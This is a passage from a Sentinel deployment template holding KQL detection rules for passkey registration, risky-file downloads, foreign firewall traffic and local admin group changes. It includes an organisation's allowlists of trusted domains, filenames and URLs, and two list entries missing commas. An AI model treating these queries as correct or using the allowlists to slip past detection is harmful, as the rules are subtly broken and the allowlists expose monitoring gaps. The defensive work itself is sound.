          "query": "let alert_id = 'BV-21095';\nlet alert_type = 'RBA';\nlet start_time = 15m;\nlet exclude_hash = true;\nlet calculate_hash = true;      \nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 47h;\nlet end_time = now();\nlet alert_bin = 15m;\nlet checkdefault = toscalar(bv_known_passkey | summarize take_anyif(bv_fido2name, bv_fido2name contains 'default'));\nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_rule', 'bv_vendor', 'bv_dest_', 'bv_role_name', 'bv_src', 'bv_aaguid', 'bv_fido2name'])         \n});\nlet excluded_description_fields = dynamic(['bv_raw', 'bv_vendor_action1']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet exclusions = array_concat(global_config['EXCLUSIONS'], BV21095_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV21095_CONFIG['RBASCORE']),1.0);\nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\n        let match = (table_parameter: (*), items:dynamic, match_type: string){\n          table_parameter\n          | extend all_data = pack_all()\n          | mv-apply e = items on (\n              extend keys = bag_keys(e)\n              | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n              | mv-apply k = keys to typeof(string) on (\n                  extend list = split(e[k],',')\n                  | mv-apply l = list to typeof(string) on (\n                      extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                      | mv-apply i = item to typeof(string) on (\n                          extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                          | summarize excluded_count = countif(compare)\n                          | extend item_excluded = excluded_count > 0\n                      )\n                      | summarize excluded_count = countif(item_excluded)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_list_item = countif(item_excluded > 0)\n              )\n              | extend matched =  key_count == excluded_list_item and key_count != 0\n              | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n              | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n              | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n          )\n          | extend match_status = iff(matched contains \"true\", match_type, '')\n  };\n  let desc_gen = (T: (*), ttype:string){\n    T\n    | extend a = pack_all()\n    | extend t = tostring(a[ttype])\n    | extend t = replace('\\n', '@new_line@',t)\n    | extend ot = extract_all(@'(\\[.*?\\])',t)\n    | mv-apply o = ot on (\n        parse o with * '~' k'~' *\n        | extend v = todynamic(a[k])\n        | extend v = iff(gettype(v) !='array', pack_array(v), v)\n        | extend r = iff(isempty(v) or (array_length(v) == 1 and (isempty(v[0]) or v[0] == 0) or array_length(v)==0),'',o)\n        | extend r = trim_end(@'\\]',r)\n        | extend r = trim_start(@'\\[.*~',r)\n        | summarize otr =make_list(r)\n    )\n    | extend tr = replace_strings(t, ot, otr )\n    | extend sdk = extract_all(@'(<bv_[\\w_]*>)',tr)\n    | extend gk = extract_all(@'(<g_bv_[\\w_]*>)',tr)\n    | mv-apply g = gk on (\n        parse g with '<g_' key '_p' *\n        | parse g with * '_p_' verb '>'\n        | extend v = a[key]\n        | extend ip = (gettype(v) == 'array' and array_length(v) > 1) or toint(v)>1\n        | extend r = case (\n            isempty(verb) and not(ip), ''\n            , isempty(verb) and ip, 's'\n            , verb == 'was' and (not(ip) or isempty(ip)), 'was'\n            , verb == 'was' and ip, 'were'\n            , verb == 'this' and ip, 'these'\n            , verb == 'this' and not(ip), 'this'\n            , verb == 'is' and (not(ip) or isempty(ip)), 'is'\n            , verb == 'is' and ip, 'are'\n        ,''\n        )\n        | summarize gr = make_list(r)\n    )\n    | mv-apply k = sdk on (\n        parse k with '<' key '>'\n        | extend v = todynamic(tostring(a[key]))\n        | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n        | extend vl = array_length(v)\n        | extend r = case(\n            vl == 1, v[0]\n            , vl == 2, strcat(v[0], ' and ', v[1])\n            ,vl  > 2, strcat(v[0], ', ', v[1], ', and ', vl-2, ' others')\n            ,'')\n    | summarize r = make_list(r))\n    | extend dr = replace_strings(tr, sdk, r)\n    | extend dr = replace_strings(dr, gk, gr)\n    | extend dr = replace('@new_line@', '\\n',dr)\n    | extend hd = coalesce(a['desc_gen'],dynamic({}))\n    | extend desc_gen = bag_set_key(hd, ttype, dr)\n  };\n  let rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId \n    | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n        let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId \n    | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n        table_parameter\n        | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n        | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n        | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n        | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n        | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n        | extend ModifiedRBAScore = case(\n          ModifiedRBAScore > 10, 10.0\n          , ModifiedRBAScore <0.1, 0.1\n          , ModifiedRBAScore\n        )\n        | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n  };            \nbvim_auditlogs(starttime=ago(start_time), endtime=end_time ,bv_tags_has='change')\n| project-keep bv_start_time, bv_src_user, bv_src_dvc*, bv_dest_*, bv_vendor_*, bv_parser, bv_src_ip, bv_user*, bv_raw\n| where bv_vendor_action has 'passkey' and bv_vendor_reason has_any ('add', 'delete')\n| mv-apply detail=parse_json(bv_raw).AdditionalDetails on ( \n    extend bv_msg = iff(detail.key == 'AdditionalInfo', detail.value, '')\n    , bv_aaguid = iff(detail.key == 'AAGuid', detail.value, '')\n    | summarize bv_msg = make_set_if(bv_msg, isnotempty(bv_msg))\n    , bv_aaguid = make_set_if(bv_aaguid, isnotempty(bv_aaguid))\n)\n|extend bv_aaguid = tostring(bv_aaguid[0])\n| project-away bv_raw\n| join kind=leftouter bv_known_passkey on bv_aaguid\n| extend defaultvalue = iff(checkdefault contains 'default', true, false)\n| summarize \n        bv_start_time = min(bv_start_time)\n        , bv_end_time = max(bv_start_time)\n        , bv_event_count = count()\n        , bv_vendor_action = make_set(bv_vendor_action, 5)\n        , bv_vendor_reason = make_set(bv_msg, 5)\n        , bv_src_ip = make_set(bv_src_ip, 5)\n        , bv_fido2name = make_set(strcat(iff(isempty(bv_fido2name), 'unknown', bv_fido2name), ' (', bv_aaguid, ')'), 5)\n        , bv_aaguid = make_set(bv_aaguid, 5)\n        , bv_dest_user = make_set(todynamic(bv_dest_user), 5)\n        , defaultvalue = take_any(defaultvalue)\n    by \n        bv_user = tolower(bv_cim_normalize_username(bv_user))\n| invoke match(exclusions, 'exclusion')\n| extend excluded = iff((alert_type in ('SOC','CUSTOM') and match_status == 'exclusion') or (alert_type == 'RBA' and visibility contains '0'), true, false)\n| where excluded == false\n| extend alert_id_temp = alert_id\n| lookup bv_desc_temp on alert_id_temp\n| invoke desc_gen('long_template')\n| invoke desc_gen('short_template')\n| invoke gen_detail_and_hash(excluded_description_fields, 300, 5,efd=excluded_dedup_fields,dh=calculate_hash)\n| where iff(exclude_hash, (BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash), true)\n| extend \n    bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)   \n    , bv_desc_l = strcat(desc_gen['long_template'],'\\n\\n',ExtendedDescription)\n    , bv_desc_s =desc_gen['short_template']\n| extend \n    bv_alarm_attacker_entities = pack_array(bv_user)\n    , bv_alarm_victim_entities = bv_dest_user            \n    , bv_mapping_tag = bv_user\n    , bv_dest_user1 = bv_dest_user[0]\n    , bv_dest_user2 = bv_dest_user[1]\n    , bv_vendor_action1 = bv_vendor_action[0]    \n    , bv_alarm_rba_score = case(defaultvalue == false and bv_fido2name contains 'unknown', real(3), bv_alarm_rba_score)  \n| project-keep\n    bv_*   ",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT47H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-21095: [RBA] Change - AuditLogs - {{bv_vendor_action1}} by {{bv_user}}",
            "alertDescriptionFormat": "Detecting when unusual hardware passkeys (like a random Feitian device) are suddenly registered in an environment that exclusively uses Microsoft Authenticator passkeys, potentially indicating unauthorized access\n\n{{bv_desc_l}}\n\ntag: RBA\nCategory: BVIM\ncim_models: change\nMITRE: T1098"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "VictimEntity": "bv_alarm_victim_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_dest_user2"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/4f2746bb-07eb-4567-9fb9-cab3494c073c')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/4f2746bb-07eb-4567-9fb9-cab3494c073c')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] Detect web requests to potentially harmful files (ASIM Web Session)",
          "description": "Refined to only trigger on Med, and High Severity.  This rule is intended to replace current \"\" rule. This rule detects web requests made to URLs containing file types such as .ps1, .bat, .vbs,.scr etc. which have the potential to be harmful if downloaded. This rule uses the [Advanced Security Information Model (ASIM)](https://aka.ms/AboutASIM) and supports any web session source that complies with ASIM.",
          "severity": "Medium",
          "enabled": true,
          "query": "// Amayor 2/3/25 Added domain-based refinement to reduce manual URL updates and improve efficiency.\nlet lookback = 80m;\n// Define Risky File Extensions\nlet RiskyFileExtensions = materialize(externaldata(Extensions: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/RiskyFileExtensionsInUrl.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomRiskyFileExtensions = (_ASIM_GetWatchlistRaw(\"Web_RiskyFileExtensions\") \n    | extend Extensions = tostring(WatchlistItem[\"Extensions\"])\n    | project Extensions\n    | where isnotempty(Extensions));\nlet CombinedRiskyFileExtensions = union RiskyFileExtensions, CustomRiskyFileExtensions;\nlet knownRiskyFileExtensions = toscalar(CombinedRiskyFileExtensions\n    | where isnotempty(Extensions)\n    | summarize make_set(Extensions, 1000));\n// Define Whitelisted Domains\nlet Whitelisted_Domains = materialize(externaldata(WhiteListedDomains: string)\n    [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/WhiteListedDomainsForWebSessionUseCases.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=True));\nlet CustomWhiteListedDomains = (_ASIM_GetWatchlistRaw(\"Web_WhiteListedDomains\") \n    | extend WhiteListedDomains = tostring(WatchlistItem[\"WhiteListedDomains\"])\n    | project WhiteListedDomains\n    | where isnotempty(WhiteListedDomains));\nlet CombinedWhitelisted_Domains = union Whitelisted_Domains, CustomWhiteListedDomains;\nlet knownWhitelisted_Domains = toscalar(CombinedWhitelisted_Domains\n    | where isnotempty(WhiteListedDomains)\n    | summarize make_set(WhiteListedDomains, 1000));\n// Define Trusted Filenames\nlet TrustedFilenames = datatable(Filename: string)\n    [\n    \"am_delta_patch_1.425.218.0_6f6036d8003cb1a9a2f9b69792c02b2d74ef4ad9.exe\",// generating a lot of noise, known patching. - DanneF\n    \"hp-cmsl\", // used for Client Management Script Library of HP (bios drivers etc.) -DanneF\n    \"oc-installer-23.4.2-windows_x64.exe\", // generating hundreds of alerts, regular admin work \n    \"b63f6fb2-903e-4ef9-9c8d-bde0e0e3b284.exe\", // block AG's daily alert\n    \"compositecontent.jar\", // apart of myeclipse 12.24.24 -DF\n    \"communitybrandwidgetloader.app\" //Salesforce extension for widget app\n    \"content.jar\", // myeclipse content\n    \"windowsdesktop-runtime-8.0.13-win-x64_c607bd4695d8037aab29499c24fd20b0525ae8db.exe\"\n];\n// Define Trusted Domains\nlet TrustedDomains = datatable(Domain: string)\n    [\n    \"microsoft.com\",\n    \"calhr.lightning.force.com\", // salesforce software\n    \"knowbe4.com\",\n    \"adobe.com\",\n    \"knowbe4.com\",\n    \"oracle.com\",\n    \"vorpsync.aspgov.com\",\n    \"globalapp.sco.ca.gov\",\n    \"aspgov.com\",\n    \"force.com\",\n    \"globalapp.sco.ca.gov\",\n    \"sco.ca.gov\",\n    \"logitech.com\",\n    \"webstorage08.five9.com\" // Five9 call center software\n    \"download.eclipse.org\",  // Eclipse is an well known IDE\n    \"eclipse.org\",\n    \"search.namequery.com\",\n    \"listserv.sco.ca.gov\",\n    \"nclh.my.salesforce-sites.com\",\n    \"https://listserv.sco.ca.gov\",\n    \"namequery.com\",\n    \"grammarly.com\",\n    \"hp.com\"\n];\n// Define Trusted URLs\nlet TrustedUrls = datatable(Url: string)\n    [\n    \"http://downloads.genuitec.com/downloads/packs/eclipse-discovery/v4.16.0/updatesite/content.jar\",\n    \"https://download.eclipse.org/technology/m2e/releases/content.jar\",\n    \"http://testng.org/testng-p2-update-site/compositecontent.jar\",\n    \"http://dl.bintray.com/testng-team/testng-p2-release/content.jar\",\n    \"https://dmvca.my.salesforce-sites.com/service/c/slalom_schedulerlightningout.app?aura.format=JSON&aura.formatAdapter=LIGHTNING_OUT\",\n    \"https://globalapp.sco.ca.gov/prod/applet/exc.jar\",\n    \"https://search.namequery.com/downloads/public/bin/windows/ctes/ctes/1.0.0.2609/ssleay32.dll\",\n    \"https://resources.namequery.com/downloads/public/bin/windows/ctes/hdc/2.0.16.6/cthdpprv.dll\",\n    \"https://download-windows.grammarly.com/versions/1.2.144.1625/grammarlyinstaller.exe\",\n    \"https://desktop.miro.com/platforms/win32-nsis-pu/miro-setup.exe\",\n    \"https://www.zipinfo.com/cgi-local/zipsrch.exe?cnty=cnty&zip=90003&Go=Go\",\n    \"https://globalapp.sco.ca.gov/prod/exc.jar\",\n    \"https://hpia.hpcloud.hp.com/downloads/cmsl/wl/hp-cmsl-1.8.0.884.exe\"\n];\n// Retrieve Threat Intelligence Indicators\nlet IP_Indicators = ThreatIntelligenceIndicator\n    | where isnotempty(NetworkIP)\n        or isnotempty(NetworkSourceIP)\n        or isnotempty(NetworkDestinationIP)\n    | extend TI_ipEntity = coalesce(NetworkIP, NetworkSourceIP, NetworkDestinationIP)\n    | where ipv4_is_private(TI_ipEntity) == false\n    | where TimeGenerated >= ago(7d) and Active == true\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by TI_ipEntity;\n// Web Session Analysis\n_Im_WebSession(starttime=ago(lookback), url_has_any=knownRiskyFileExtensions, eventresult='Success')\n| where DstFQDN_dynamic !in (TrustedDomains) // Checking for list of Trusted domains\n| project\n    Url,\n    SrcIpAddr,\n    TimeGenerated,\n    SrcUsername,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber\n| extend requestedFileName = tostring(split(tostring(parse_url(Url)[\"Path\"]), '/')[-1])\n| extend requestedFileExt = extract(@'(\\.\\w+)$', 1, requestedFileName, typeof(string))\n| where isnotempty(requestedFileExt) // Ensure requestedFileExt is valid\n| where requestedFileExt in~ (knownRiskyFileExtensions)\n| where requestedFileName !in (TrustedFilenames) // Exclude trusted filenames\n| extend FQDN = split(parse_url(Url)[\"Host\"], '.')\n| extend Domain = iif(array_length(FQDN) > 1, strcat(FQDN[-2], '.', FQDN[-1]), FQDN)\n| where not (Url in (TrustedUrls) or Domain in (TrustedDomains)) // Exclude trusted URLs OR trusted domains\n| where Domain !in~ (knownWhitelisted_Domains)\n| project-away FQDN\n| summarize \n    EventCount = count(),\n    EventStartTime = min(TimeGenerated),\n    EventEndTime = max(TimeGenerated)\n    by\n    SrcUsername,\n    SrcIpAddr,\n    SrcHostname,\n    DstIpAddr,\n    DstPortNumber,\n    Domain,\n    Url,\n    requestedFileName,\n    requestedFileExt\n| join kind=leftouter (\n    IP_Indicators \n    | project TI_ipEntity\n    )\n    on $left.SrcIpAddr == $right.TI_ipEntity\n| extend TIMatch = isnotempty(TI_ipEntity)\n| extend\n    Name = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 0)[0]), SrcUsername),\n    UPNSuffix = iif(SrcUsername contains \"@\", tostring(split(SrcUsername, '@', 1)[0]), \"\")\n| project \n    SrcUsername,\n    Name,\n    UPNSuffix,\n    SrcIpAddr,\n    DstIpAddr,\n    DstPortNumber,\n    Domain,\n    Url,\n    requestedFileName,\n    requestedFileExt, \n    EventCount,\n    EventStartTime,\n    EventEndTime,\n    TIMatch\n",
          "queryFrequency": "PT5M",
          "queryPeriod": "PT5M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Execution",
            "Persistence"
          ],
          "techniques": [
            "T1133",
            "T1566",
            "T1203"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "User '{{SrcUsername}}' with IP address '{{SrcIpAddr}}' accessed a potentially harmful URL",
            "alertDescriptionFormat": "User accessed URL - '{{Url}}' that contains a file - '{{requestedFileName}}' with risky extension. Downloading this file could pose a potential risk",
            "alertDynamicProperties": []
          },
          "customDetails": {
            "TIMatch": "TIMatch"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIpAddr"
                },
                {
                  "identifier": "AddressScope",
                  "columnName": "TIMatch"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "Url"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "SrcUsername"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Name"
                },
                {
                  "identifier": "UPNSuffix",
                  "columnName": "UPNSuffix"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/b1071d45-8709-42f3-89d5-fa35c4606015')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/b1071d45-8709-42f3-89d5-fa35c4606015')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] F5_AFM_Non-US Geo Location Access Detection with TI Correlation",
          "description": "This KQL query detects and alerts on any network traffic originating from non-US geographic locations, Including IPs that are marked as \"unknown\" in the logs. It monitors traffic that is accepted or established, helping identify potential unauthorized access attempts from foreign entities.",
          "severity": "Medium",
          "enabled": true,
          "query": "F5Telemetry_AFM_CL\n| extend acl_rule_name_s = tostring(acl_rule_name_s)\n| where TimeGenerated > ago(1h)\n| where isnotempty(acl_rule_name_s)\n| where not(src_geo_s startswith \"US/\")\n| where not(source_ip_s startswith \"10.\" and dest_ip_s startswith \"10.\") // Filtering out LDAP connections between local IPs to reduce noise. -DF\n| project TimeGenerated, src_geo_s, source_ip_s, dest_ip_s, dest_port_s, action_s, acl_rule_name_s\n| join kind=leftouter (\n    ThreatIntelligenceIndicator\n    | where Active == true\n    | project NetworkSourceIP\n) on $left.source_ip_s == $right.NetworkSourceIP\n| extend TI_Found = iif(isnotempty(NetworkSourceIP), true, false)\n| order by TimeGenerated desc\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/a2c6e432-31cc-4361-9524-97072364e920')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/a2c6e432-31cc-4361-9524-97072364e920')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Local Admin Group Changes",
          "description": "This query searches for changes to the local administrators group.\nBlogpost: https://www.verboon.info/2020/09/hunting-for-local-group-membership-changes.",
          "severity": "High",
          "enabled": true,
          "query": "let machineAccountSIDs = dynamic([\n  \"S-1-5-18\",\n  \"S-1-5-20\",\n  \"S-1-5-19\"]);\nlet ADAZUsers =  IdentityInfo \n| extend DirectoryDomain = AccountDomain \n| extend DirectoryAccount = AccountName \n| extend OnPremSid = AccountSID\n| distinct DirectoryDomain , DirectoryAccount , OnPremSid , AccountCloudSID, AccountUPN, GivenName, Surname;\n // check for any new created or modified local accounts \nlet NewUsers =  DeviceEvents\n| where ActionType contains \"UserAccountCreated\" or ActionType contains \"UserAccountModified\"\n| extend lUserAdded = AccountName\n| extend NewUserSID = AccountSid\n| extend laccountdomain = AccountDomain\n| distinct NewUserSID, lUserAdded,laccountdomain;\n// Check for any local group changes and enrich the data with the account name obtained from the previous query\nDeviceEvents \n| where ActionType == 'UserAccountAddedToLocalGroup'\n// Exclude machine and wellknown SIDs \n| where (AccountSid !in (machineAccountSIDs)) and (AccountSid matches regex @\"S-\\d-\\d+-\\d+-(\\d+-){1,5}\\d+\")\n| extend LocalGroupSID = tostring(parse_json(AdditionalFields).GroupSid)\n| extend LocalGroup = tostring(parse_json(AdditionalFields).GroupName)\n| extend AddedAccountSID = AccountSid\n| extend Actor = trim(@\"[^\\w]+\",InitiatingProcessAccountName)\n// limit to local administrators group\n// | where LocalGroupSID contains \"S-1-5-32-544\"\n| join kind=leftouter    (NewUsers)\non $left.AddedAccountSID == $right.NewUserSID\n| project TimeGenerated, DeviceName, LocalGroup,LocalGroupSID, AddedAccountSID, lUserAdded , Actor, ActionType , laccountdomain \n| join kind=innerunique  (ADAZUsers)\non $left.AddedAccountSID == $right.OnPremSid\n| extend UserAdded = iff(isnotempty(lUserAdded),strcat(laccountdomain,\"\\\\\", lUserAdded), strcat(DirectoryDomain,\"\\\\\", DirectoryAccount))\n| extend AccountName = iff(isnotempty(lUserAdded), lUserAdded, DirectoryAccount)\n| project TimeGenerated, DeviceName, LocalGroup, LocalGroupSID, AddedAccountSID, UserAdded ,Actor, ActionType, AccountName, laccountdomain  \n| where DeviceName !contains Actor\n// Provide details on actors that added users\n// | summarize count()  by Actor \n// | join ADAZUsers\n// on $left.Actor == $right.DirectoryAccount \n// | render piechart\n| extend HostName = iff(DeviceName has '.', substring(DeviceName, 0, indexof(DeviceName, '.')), DeviceName)\n| extend DnsDomain = iff(DeviceName has '.', substring(DeviceName, indexof(DeviceName, '.') + 1), \"\")\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "63aa43c2-e88e-4102-aea5-0432851c541a",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "DeviceName"
                },
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "UserAdded"
                },
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "laccountdomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.2"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3da089e1-5bce-432d-8d48-417fb5f027b0')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3da089e1-5bce-432d-8d48-417fb5f027b0')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Authentications of Privileged Accounts Outside of Expected Controls",
          "description": "Detects when a privileged user account successfully authenticates from a location, device or ASN that another admin has not logged in from in the last 7 days.\n  Privileged accounts are a key target for threat actors, monitoring for logins from these accounts that deviate from normal activity can help identify compromised accounts.\n  Authentication attempts should be investigated to ensure the activity was legitimate and if there is other similar activity.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-user-accounts#monitoring-for-successful-unusual-sign-ins",
          "severity": "Medium",
          "enabled": true,
